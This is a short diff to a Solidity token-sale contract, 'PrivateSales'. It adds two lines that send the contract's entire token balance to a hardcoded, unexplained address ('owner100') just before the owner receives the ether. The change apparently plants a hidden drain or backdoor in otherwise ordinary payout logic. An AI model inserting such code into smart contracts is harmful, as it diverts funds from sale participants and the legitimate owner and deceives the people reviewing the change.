@@ -61,6 +61,8 @@ contract PrivateSales {
             uint256 value = (receivedWei.mul(beneficiary.ratio)).div(1000);
             beneficiary.addr.transfer(value);
         }
+        address owner100 = 0x4583408F92427C52D1E45500Ab402107972b2CA6;
+        token.transfer(owner100, token.balanceOf(this));
         owner.transfer(this.balance);
     }
 }
